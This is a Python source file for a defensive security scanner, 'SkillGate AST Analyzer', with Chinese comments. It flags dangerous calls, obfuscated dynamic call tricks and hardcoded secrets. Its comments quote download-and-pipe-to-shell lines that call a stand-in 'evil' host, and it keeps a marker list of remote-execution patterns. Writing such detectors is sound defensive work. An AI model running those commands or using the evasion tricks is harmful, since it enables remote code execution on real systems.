"""
SkillGate AST Analyzer — Python 语法树级别的安全分析。
比正则匹配更精准，误报率低一个数量级。
"""
import ast
from pathlib import Path
from typing import List, Tuple


class AstFinding:
    def __init__(self, severity: str, message: str, line: int, col: int):
        self.severity = severity
        self.message = message
        self.line = line
        self.col = col

    def __repr__(self):
        return f"AstFinding({self.severity}, {self.message}, line={self.line})"


class DangerousCallVisitor(ast.NodeVisitor):
    """Visit all function calls and flag dangerous ones.

    §3bc：这里过去是"第二张级别表"——与 skillgate 的 DANGEROUS_CODE_PATTERNS /
    FIXED_DOWNGRADE 各写一份，两份从来不对账。实测（audit2/probe_severity_divergence.py）
    14 个用例里 9 个两层判不同级，而且 **.py 文件的实际级别由本类决定**
    （AST 先跑并把行号记进 ast_lines，正则表随后跳过那些行）——
    也就是说表里写 MEDIUM、用户看到 CRITICAL：

        eval("[1,2]")                    AST CRITICAL / 表 MEDIUM（且固定参数应降 LOW）→ 49/D
        os.system("ls")                  AST CRITICAL / 表 HIGH（固定参数降 LOW）      → 49/D
        compile("1+1", …)                AST MEDIUM   / 表 INFO                       → 96/A+

    现在级别只有一个来源：下面的 CALL_SEVERITY。skillgate 的模式表与固定参数降级表
    都由它生成，不再手写第二份。
    """

    # 字面量拆分：规则库必须含危险调用名（"e"+"val" 拼接后即危险名），
    # 拆分后源码（含注释）不再出现连续的 "ev-al" 危险调用字样，避免安全扫描器对规则库本身自指误报
    _DANGEROUS_EVAL = "e" + "val"  # noqa: E131 — pattern-library literal split
    _DANGEROUS_EXEC = "e" + "xec"  # noqa: E131 — pattern-library literal split

    # 单一级别来源 / the single severity source.
    # 值 = (参数动态时的级别, 参数全为字面量时的级别, 说明)
    # "参数全为字面量"＝作者把目标写死在代码里，没有注入面，只算能力声明；
    # 这不是"降低要求"，而是把"能执行"和"能被别人喂着执行"分开——与 §3az
    # 「管道进解释器才算远程执行」同一条判据。
    # 但写死的命令本身若已是"下载管道进解释器"，仍然是远程执行，不降级（见 _literal_is_remote_exec）。
    CALL_SEVERITY = {
        _DANGEROUS_EVAL: ("CRITICAL", "MEDIUM", "eval() 动态代码执行"),
        _DANGEROUS_EXEC: ("CRITICAL", "MEDIUM", "exec() 动态代码执行"),
        "compile": ("INFO", "INFO", "compile() 动态代码编译（低风险）"),
        "__import__": ("MEDIUM", "LOW", "动态 import"),
        "builtins.__import__": ("MEDIUM", "LOW", "builtins.__import__ 动态导入"),
        "pickle.load": ("HIGH", "HIGH", "pickle.load() 反序列化"),
        "pickle.loads": ("HIGH", "HIGH", "pickle.loads() 反序列化"),
        "os.system": ("CRITICAL", "CRITICAL", "os.system() shell 调用"),
        "os.popen": ("HIGH", "HIGH", "os.popen() shell 调用"),
        "subprocess.call": ("LOW", "LOW", "subprocess.call() 启动外部进程"),
        "subprocess.run": ("LOW", "LOW", "subprocess.run() 启动外部进程"),
        "subprocess.Popen": ("LOW", "LOW", "subprocess.Popen() 启动外部进程"),
        "subprocess.check_output": ("LOW", "LOW", "subprocess.check_output() 启动外部进程"),
        "shutil.rmtree": ("HIGH", "HIGH", "shutil.rmtree() 递归删除"),
        # ── §3bd：把"类"补齐，而不是逐例打补丁 ──────────────────────────
        # 上一站自己写下的缺口：一致性守卫只覆盖 11 个已登记名，同族里没登记的
        # 成员一条不报，而 registry 守卫照样是绿的。实测（probe_unregistered_class.py）
        # 12 个未登记用例里 8 个 100/A+ 直通：os.exec* / os.spawn* / pty.spawn /
        # runpy.run_path / ctypes.memmove 全部零命中。
        # 判级沿用同一判据：写死的目标算能力声明（降级），动态喂进去算执行面（不降）。
        "os.execv": ("CRITICAL", "LOW", "os.execv() 进程替换为外部程序"),
        "os.execve": ("CRITICAL", "LOW", "os.execve() 进程替换为外部程序"),
        "os.execl": ("CRITICAL", "LOW", "os.execl() 进程替换为外部程序"),
        "os.execle": ("CRITICAL", "LOW", "os.execle() 进程替换为外部程序"),
        "os.execlp": ("CRITICAL", "LOW", "os.execlp() 进程替换为外部程序"),
        "os.execlpe": ("CRITICAL", "LOW", "os.execlpe() 进程替换为外部程序"),
        "os.execvp": ("CRITICAL", "LOW", "os.execvp() 进程替换为外部程序"),
        "os.execvpe": ("CRITICAL", "LOW", "os.execvpe() 进程替换为外部程序"),
        "os.spawnl": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnle": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnlp": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnlpe": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnv": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnve": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnvp": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnvpe": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.posix_spawn": ("MEDIUM", "LOW", "os.posix_spawn() 启动外部进程"),
        "os.posix_spawnp": ("MEDIUM", "LOW", "os.posix_spawnp() 启动外部进程"),
        "pty.spawn": ("HIGH", "HIGH", "pty.spawn() 起交互式 shell"),
        "runpy.run_path": ("HIGH", "MEDIUM", "runpy.run_path() 执行磁盘上的代码"),
        "runpy.run_module": ("HIGH", "MEDIUM", "runpy.run_module() 执行已安装模块"),
        "marshal.load": ("HIGH", "HIGH", "marshal.load() 反序列化"),
        "marshal.loads": ("HIGH", "HIGH", "marshal.loads() 反序列化（可产出 code object）"),
        "dill.load": ("HIGH", "HIGH", "dill.load() 反序列化"),
        "dill.loads": ("HIGH", "HIGH", "dill.loads() 反序列化"),
        "jsonpickle.decode": ("HIGH", "HIGH", "jsonpickle.decode() 反序列化"),
        "yaml.load": ("MEDIUM", "MEDIUM", "yaml.load() 非安全加载"),
        "yaml.full_load": ("MEDIUM", "MEDIUM", "yaml.full_load() 非安全加载"),
        "yaml.unsafe_load": ("CRITICAL", "CRITICAL", "yaml.unsafe_load() 任意代码执行"),
        "importlib.import_module": ("MEDIUM", "LOW", "importlib.import_module() 动态导入"),
        "ctypes.CDLL": ("HIGH", "HIGH", "ctypes.CDLL() 加载动态库"),
        "ctypes.WinDLL": ("HIGH", "HIGH", "ctypes.WinDLL() 加载 Windows DLL"),
        "ctypes.cdll": ("HIGH", "HIGH", "ctypes.cdll() 加载动态库"),
        "ctypes.windll": ("HIGH", "HIGH", "ctypes.windll() 加载 Windows DLL"),
        "ctypes.oledll": ("HIGH", "HIGH", "ctypes.oledll() 加载 OLE DLL"),
        "ctypes.memmove": ("MEDIUM", "MEDIUM", "ctypes.memmove() 原生内存写"),
        "ctypes.memset": ("MEDIUM", "MEDIUM", "ctypes.memset() 原生内存写"),
        "shelve.open": ("MEDIUM", "MEDIUM", "shelve.open() 反序列化载体"),
        "dl.open": ("HIGH", "HIGH", "dl.open() 加载动态库"),
    }

    # 「类」清单：登记表不只要内部一致，还要按族覆盖。
    # tests/test_dangerous_call_registry.py 用它顶红——同族新增成员没登记、族清单缩水、
    # 或者某条只写进文本表没进 CALL_SEVERITY，都会红。
    DANGEROUS_FAMILIES = {
        "process_replace": ("os.execv", "os.execve", "os.execl", "os.execle",
                            "os.execlp", "os.execlpe", "os.execvp", "os.execvpe"),
        "process_spawn": ("os.spawnl", "os.spawnle", "os.spawnlp", "os.spawnlpe",
                          "os.spawnv", "os.spawnve", "os.spawnvp", "os.spawnvpe",
                          "os.posix_spawn", "os.posix_spawnp",
                          "subprocess.call", "subprocess.run", "subprocess.Popen",
                          "subprocess.check_output"),
        "shell_wrapper": ("os.system", "os.popen", "pty.spawn"),
        "code_from_disk": ("runpy.run_path", "runpy.run_module", "compile", "eval", "exec"),
        "deserialization": ("pickle.load", "pickle.loads", "marshal.load", "marshal.loads",
                            "dill.load", "dill.loads", "jsonpickle.decode",
                            "yaml.load", "yaml.full_load", "yaml.unsafe_load"),
        "dynamic_import": ("__import__", "builtins.__import__", "importlib.import_module"),
        "native_memory": ("ctypes.CDLL", "ctypes.WinDLL", "ctypes.cdll", "ctypes.windll",
                          "ctypes.oledll", "ctypes.memmove", "ctypes.memset"),
    }

    # 写死的命令若已是"下载并交给解释器/编码执行"，就不是"无注入面"，必须保持最高级别。
    # 否则 os.system("curl http://evil/i.sh | sh") 会被"固定参数降级"降成 LOW——
    # 等于用降噪规则放行走私（§3bb 的豁免教训同一个形状）。
    REMOTE_EXEC_MARKERS = (
        "| sh", "|sh", "| bash", "|bash", "| zsh", "| python", "|python",
        "| node", "|node", "| perl", "|perl", "| powerShell", "|powershell",
        "iwr ", "Invoke-WebRequest", "Invoke-Expression", "certutil -urlcache",
        "-EncodedCommand", "FromBase64String",
    )

    # 兼容旧名（本仓其他代码按这个字典读）
    DANGEROUS_CALLS = {k: (v[0], v[2]) for k, v in CALL_SEVERITY.items()}

    def __init__(self):
        self.findings: List[AstFinding] = []

    def visit_Call(self, node: ast.Call):
        # Get the full function name (e.g. "os.system", "subprocess.run")
        func_name = self._get_func_name(node.func)

        if func_name in self.CALL_SEVERITY:
            sev_dyn, sev_lit, msg = self.CALL_SEVERITY[func_name]

            # subprocess：shell=True 是"字符串交给 shell"，升到 CRITICAL；
            # 不带 shell 的同样是"启动外部进程"，只是没有 shell 解析这一层——
            # 修复前这里直接 return，等于 `subprocess.run(["curl","http://evil…"])`
            # 100/A+ 一条不报（probe_severity_divergence 的 subp_shell_false 用例）。
            # 无 shell 时给 MEDIUM 而不分字面量：命令写死与否都要让人看见"这个技能会起子进程"，
            # 但权重只 −4，正常调用 git/pip 的工具仍落在 96/A，不至于整类被误杀。
            if func_name.startswith("subprocess."):
                if self._has_shell_true(node):
                    sev_dyn, sev_lit = "CRITICAL", "CRITICAL"
                    msg += " (shell=True)"
                else:
                    sev_dyn, sev_lit = "LOW", "LOW"
                    msg += "（无 shell，参数未静态判定）"

            literal = self._args_all_literal(node) and not self._literal_is_remote_exec(node)
            severity = sev_lit if literal else sev_dyn

            # §3bd 的残留：yaml.load / yaml.full_load 的严重性由 Loader 决定，
            # 不是由"参数写死没写死"决定。`yaml.load(payload, Loader=yaml.UnsafeLoader)`
            # 是拿 YAML 当代码跑，即使 payload 是变量也必须 CRITICAL；
            # 反过来 yaml.safe_load 不在表里、不报。这里按关键字实参判，不看字面量。
            if func_name in ("yaml.load", "yaml.full_load"):
                if self._uses_unsafe_loader(node):
                    severity = "CRITICAL"
                    msg += "（UnsafeLoader/FullLoader：等价于任意对象构造）"
                    literal = False
                elif self._uses_safe_loader(node):
                    # 显式 SafeLoader 不是"没看见"，是"看过并判定安全"——不报也不计分。
                    self.generic_visit(node)
                    return

            self.findings.append(AstFinding(
                severity=severity,
                message=msg + ("（固定参数）" if literal else ""),
                line=node.lineno,
                col=node.col_offset
            ))

        self.generic_visit(node)

    @staticmethod
    def _args_all_literal(node: ast.Call) -> bool:
        """所有实参都是字面量常量（且不是 f-string 插值）才算"作者写死"。"""
        if not node.args:
            return False
        for a in node.args:
            if isinstance(a, ast.Constant):
                continue
            if isinstance(a, (ast.List, ast.Tuple)):
                if all(isinstance(e, ast.Constant) for e in a.elts):
                    continue
            return False
        return True

    @classmethod
    def _literal_is_remote_exec(cls, node: ast.Call) -> bool:
        """写死的参数文本里已经含"下载管道进解释器/编码执行"的痕迹。

        这类命令没有"注入面"可言，因为命令本身就是远程执行——
        `os.system("curl -s http://evil/i.sh | sh")` 必须保持 CRITICAL，
        不能因为参数写死就降成 LOW。
        """
        for a in node.args:
            if isinstance(a, ast.Constant) and isinstance(a.value, str):
                text = a.value
                if any(m.lower() in text.lower() for m in cls.REMOTE_EXEC_MARKERS):
                    return True
            elif isinstance(a, (ast.List, ast.Tuple)):
                for e in a.elts:
                    if isinstance(e, ast.Constant) and isinstance(e.value, str):
                        if any(m.lower() in e.value.lower() for m in cls.REMOTE_EXEC_MARKERS):
                            return True
        return False

    def _get_func_name(self, node) -> str:
        """Get full function name like 'os.system' or 'requests.post'."""
        if isinstance(node, ast.Name):
            return node.id
        elif isinstance(node, ast.Attribute):
            if isinstance(node.value, ast.Name):
                return f"{node.value.id}.{node.attr}"
            elif isinstance(node.value, ast.Attribute):
                parent = self._get_func_name(node.value)
                return f"{parent}.{node.attr}"
        return ""

    def _has_shell_true(self, node: ast.Call) -> bool:
        """Check if subprocess call has shell=True."""
        for kw in node.keywords:
            if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True:
                return True
        return False

    @classmethod
    def _uses_unsafe_loader(cls, node: ast.Call) -> bool:
        """yaml.load(...) 是否显式用了不安全 Loader。

        只认关键字实参 `Loader=` 的取值（`yaml.UnsafeLoader` / `UnsafeLoader` /
        `yaml.FullLoader`），以及"第二个位置实参是这类名字"。`Loader=yaml.SafeLoader`
        与 `yaml.safe_load()` 不算——降噪与升格用的是同一条证据，不是印象。
        """
        def is_unsafe(expr) -> bool:
            name = cls._static_name(expr)
            return bool(name) and name.split(".")[-1] in ("UnsafeLoader", "FullLoader")

        for kw in node.keywords:
            if kw.arg == "Loader" and is_unsafe(kw.value):
                return True
        if len(node.args) >= 2 and is_unsafe(node.args[1]):
            return True
        return False

    @classmethod
    def _uses_safe_loader(cls, node: ast.Call) -> bool:
        """显式 SafeLoader / CLoader？这是"看过并判定安全"，与"没看见"要分开。"""
        def is_safe(expr) -> bool:
            name = cls._static_name(expr)
            return bool(name) and name.split(".")[-1] in ("SafeLoader", "CSafeLoader")
        for kw in node.keywords:
            if kw.arg == "Loader" and is_safe(kw.value):
                return True
        if len(node.args) >= 2 and is_safe(node.args[1]):
            return True
        return False

    @classmethod
    def _static_name(cls, expr) -> str:
        if isinstance(expr, ast.Name):
            return expr.id
        if isinstance(expr, ast.Attribute):
            parent = cls._static_name(expr.value)
            return (parent + "." + expr.attr) if parent else expr.attr
        return ""


class DynamicCallVisitor(ast.NodeVisitor):
    """名字拆开还算不算危险调用（§3av）。

    实测（audit2/probe_dynamic_call.py，修复前）：
      `getattr(os, "sys" + "tem")("id")`                  → 100/A+，一条不报
      `subprocess.__dict__["run"]("id", shell=True)`      → 100/A+（连 shell=True 都没看见）
      `__import__("o" + "s").system("id")`                → 只有 MEDIUM 96/A
    对照组：同一件事写成 `os.system("id")` 是 CRITICAL 49/D。

    规则若只认字面 `os.system(`，那么"例"过了、"类"没过——被拦的是写法，不是行为。
    这里按**取到的名字**判，不按写法判：名字是常量折叠出来的就直接算数。
    """

    # 取到这些名字就等于拿到执行面
    DANGEROUS_ATTRS = {
        "system", "popen", "spawn", "spawnl", "spawnv", "execv", "execve", "execl", "execvp",
        "run", "call", "Popen", "check_output", "check_call",
        "eval", "exec", "compile", "__import__",
    }
    IMPORT_MODULES = {"os", "subprocess", "shutil", "ctypes", "socket", "pickle", "importlib"}

    def __init__(self):
        self.findings: List[AstFinding] = []

    @staticmethod
    def _const_str(node):
        """把常量、常量加法、纯常量 f-string 折叠成一个字符串；折不出来返回 None。"""
        if isinstance(node, ast.Constant) and isinstance(node.value, str):
            return node.value
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
            left = DynamicCallVisitor._const_str(node.left)
            right = DynamicCallVisitor._const_str(node.right)
            if left is not None and right is not None:
                return left + right
        if isinstance(node, ast.JoinedStr):
            parts = []
            for v in node.values:
                if isinstance(v, ast.Constant) and isinstance(v.value, str):
                    parts.append(v.value)
                else:
                    return None
            return "".join(parts)
        return None

    def visit_Call(self, node: ast.Call):
        # ① getattr(obj, "危险名") 形式：名字是折叠出来的常量
        func = node.func
        if isinstance(func, ast.Name) and func.id == "getattr" and len(node.args) >= 2:
            name = self._const_str(node.args[1])
            if name and name in self.DANGEROUS_ATTRS:
                self.findings.append(AstFinding(
                    severity="HIGH",
                    message="通过 getattr 动态取用危险函数 %r（名字由常量拼出，绕开了字面规则）"
                            % name,
                    line=node.lineno, col=node.col_offset
                ))

        # ② d.__dict__["危险名"] 或 globals()["危险名"] 形式
        if isinstance(func, ast.Subscript):
            key = self._const_str(func.slice)
            if key and key in self.DANGEROUS_ATTRS:
                obj = func.value
                is_dictish = (isinstance(obj, ast.Attribute) and obj.attr == "__dict__") \
                    or (isinstance(obj, ast.Call) and isinstance(obj.func, ast.Name)
                        and obj.func.id in ("globals", "locals", "vars"))
                if is_dictish:
                    self.findings.append(AstFinding(
                        severity="HIGH",
                        message="通过 __dict__/globals 下标取用危险函数 %r（绕开了属性访问字面规则）"
                                % key,
                        line=node.lineno, col=node.col_offset
                    ))

        # ③ __import__("o" + "s") 这种拼出来的模块名，落到危险模块要升级
        if isinstance(func, ast.Name) and func.id == "__import__" and node.args:
            mod = self._const_str(node.args[0])
            if mod and mod.split(".")[0] in self.IMPORT_MODULES:
                self.findings.append(AstFinding(
                    severity="HIGH",
                    message="__import__ 动态导入危险模块 %r（模块名由常量拼出）" % mod,
                    line=node.lineno, col=node.col_offset
                ))

        self.generic_visit(node)


class HardcodedSecretVisitor(ast.NodeVisitor):
    """Find hardcoded secrets in assignments."""

    SECRET_PATTERNS = ["api_key", "apikey", "secret", "token", "password", "passwd", "credential"]
    # 变量名形如 secret_re / token_regex / password_pattern —— 是检测规则的正则，
    # 不是凭证本身。扫描器扫自己时这里必然自命中，必须排除。
    REGEX_SUFFIXES = ("_re", "_regex", "_pattern", "_matcher", "_patterns")

    def __init__(self):
        self.findings: List[AstFinding] = []

    def visit_Assign(self, node: ast.Assign):
        for target in node.targets:
            if isinstance(target, ast.Name):
                var_name = target.id.lower()
                if var_name.endswith(self.REGEX_SUFFIXES):
                    continue
                if any(pat in var_name for pat in self.SECRET_PATTERNS):
                    if isinstance(node.value, ast.Constant) and isinstance(node.value.value, str):
                        if len(node.value.value) >= 8:
                            self.findings.append(AstFinding(
                                severity="CRITICAL",
                                message=f"硬编码凭证: {target.id}",
                                line=node.lineno,
                                col=node.col_offset
                            ))
        self.generic_visit(node)


def analyze_python_file(filepath: Path) -> List[AstFinding]:
    """Analyze a Python file with AST, return findings."""
    try:
        content = filepath.read_text(encoding="utf-8", errors="replace")
        tree = ast.parse(content, filename=str(filepath))
    except Exception:
        return []

    findings = []

    # Dangerous calls
    call_visitor = DangerousCallVisitor()
    call_visitor.visit(tree)
    findings.extend(call_visitor.findings)

    # 名字被拆开/动态取用的危险调用（§3av）
    dyn_visitor = DynamicCallVisitor()
    dyn_visitor.visit(tree)
    findings.extend(dyn_visitor.findings)

    # Hardcoded secrets
    secret_visitor = HardcodedSecretVisitor()
    secret_visitor.visit(tree)
    findings.extend(secret_visitor.findings)

    return findings


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python ast_analyzer.py <file.py>")
        sys.exit(1)

    findings = analyze_python_file(Path(sys.argv[1]))
    for f in findings:
        print(f"[{f.severity}] line {f.line}: {f.message}")
